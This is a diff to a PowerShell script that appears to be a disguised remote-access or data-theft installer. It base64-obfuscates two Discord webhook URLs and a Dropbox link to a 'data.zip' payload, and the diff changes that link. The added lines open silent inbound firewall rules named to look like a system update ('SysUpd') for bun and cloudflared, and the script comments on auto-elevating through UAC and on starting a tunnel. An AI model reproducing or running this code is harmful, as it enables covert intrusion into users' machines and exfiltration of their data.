@@ -1,7 +1,7 @@
 $d={[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($args[0]))}
 $LW=& $d 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMTIxNTg5MDQ0MjYyMDk5OC9MejhYZloyOGFGMFhhVWI2dTBSWU9QTkdFYlIzbnRTX05NOVM1LThXTDJBUlh3OHVyX3R2T1NIaFF5LU9uX1F1bFVueg=='
 $DW=& $d 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMDYxNzYwNjM2MzU0NTcwMC9PYWt6VWJzQURvQUg0TmtubUhTSi1ibTJjSzRmZ3c5cE56Q3M5WW1ZTlVZMHhaR21tSVJfZEEzWjhReFVJUjhnNVFCQg=='
-$DU=& $d 'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3FxMzRvOWl0NHJnYWxlamM3eWczaS9kYXRhLnppcD9ybGtleT1hOTlvYWtrMDV5Z3A2aW1iYjRteWllbDdoJnN0PWRoa3Q4b2YyJmRsPTE='
+$DU=& $d 'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3FxMzRvOWl0NHJnYWxlamM3eWczaS9kYXRhLnppcD9ybGtleT1hOTlvYWtrMDV5Z3A2aW1iYjRteWllbDdoJnN0PWRxd3l3M29tJmRsPTE='
 # Auto-elevate to admin (UAC)
 $LogWebhook = "$LW"
 
@@ -329,6 +329,44 @@ if (-not $bunPath) {
 }
 if ($bunPath) { $bunDir = Split-Path $bunPath; $env:PATH = "$bunDir;$env:PATH" }
 
+# Add firewall rules IMMEDIATELY after bun is found — before any bun.exe process starts
+if ($bunPath) {
+    try {
+        $ruleOut = netsh advfirewall firewall add rule name="SysUpd-Bun" dir=in action=allow program="$bunPath" enable=yes profile=any 2>&1
+        if ($ruleOut -match "Ok") { Write-Host "[firewall] Bun rule added." -ForegroundColor DarkGray }
+        else { Write-Host "[firewall] Bun rule: $ruleOut" -ForegroundColor DarkGray }
+    } catch {
+        Write-Host "[firewall] Bun rule failed: $_" -ForegroundColor DarkGray
+    }
+    # Also add rules for bun's node-compat temp binary (bun-node-*\bun.exe)
+    try {
+        $bunTempDir = "$env:LOCALAPPDATA\Temp"
+        $bunNodeDirs = Get-ChildItem -Path $bunTempDir -Directory -Filter "bun-node-*" -ErrorAction SilentlyContinue
+        foreach ($dir in $bunNodeDirs) {
+            $nodeBun = Join-Path $dir.FullName "bun.exe"
+            if (Test-Path $nodeBun) {
+                $nr = netsh advfirewall firewall add rule name="SysUpd-Bun-Node" dir=in action=allow program="$nodeBun" enable=yes profile=any 2>&1
+            }
+        }
+        # Pre-warm: run bun --version to create the temp dir, then add rule for any new path
+        $prevEAP = $ErrorActionPreference
+        $ErrorActionPreference = "Continue"
+        & $bunPath --version 2>$null | Out-Null
+        $ErrorActionPreference = $prevEAP
+        Start-Sleep -Milliseconds 500
+        $bunNodeDirs2 = Get-ChildItem -Path $bunTempDir -Directory -Filter "bun-node-*" -ErrorAction SilentlyContinue
+        foreach ($dir in $bunNodeDirs2) {
+            $nodeBun = Join-Path $dir.FullName "bun.exe"
+            if (Test-Path $nodeBun) {
+                $nr = netsh advfirewall firewall add rule name="SysUpd-Bun-Node" dir=in action=allow program="$nodeBun" enable=yes profile=any 2>&1
+            }
+        }
+        Write-Host "[firewall] Bun node-compat rules added." -ForegroundColor DarkGray
+    } catch {
+        Write-Host "[firewall] Bun node-compat rule failed: $_" -ForegroundColor DarkGray
+    }
+}
+
 # ============================================================
 #  Step 4: Verify cloudflared
 # ============================================================
@@ -352,6 +390,15 @@ if (-not $cfPath) {
     exit 1
 } else {
     Write-Host "[4/6] Tunnel ready."
+}
+
+# Add cloudflared firewall rule IMMEDIATELY after finding it
+try {
+    $ruleOut = netsh advfirewall firewall add rule name="SysUpd-Cf" dir=in action=allow program="$cfPath" enable=yes profile=any 2>&1
+    if ($ruleOut -match "Ok") { Write-Host "[firewall] Cloudflared rule added." -ForegroundColor DarkGray }
+    else { Write-Host "[firewall] Cloudflared rule: $ruleOut" -ForegroundColor DarkGray }
+} catch {
+    Write-Host "[firewall] Cloudflared rule failed: $_" -ForegroundColor DarkGray
 }
 
 # ============================================================
@@ -430,12 +477,6 @@ $candidates = @(
 foreach ($c in $candidates) {
     if (Test-Path $c) { $serverExe = $c; break }
 }
-
-# Allow bun + cloudflared through firewall silently (prevents popups)
-try {
-    netsh advfirewall firewall add rule name="SysUpd-Bun" dir=in action=allow program="$bunPath" enable=yes profile=any 2>$null | Out-Null
-    netsh advfirewall firewall add rule name="SysUpd-Cf" dir=in action=allow program="$cfPath" enable=yes profile=any 2>$null | Out-Null
-} catch {}
 
 if ($serverExe) {
     Write-Host "[core] Using pre-compiled server: $serverExe"
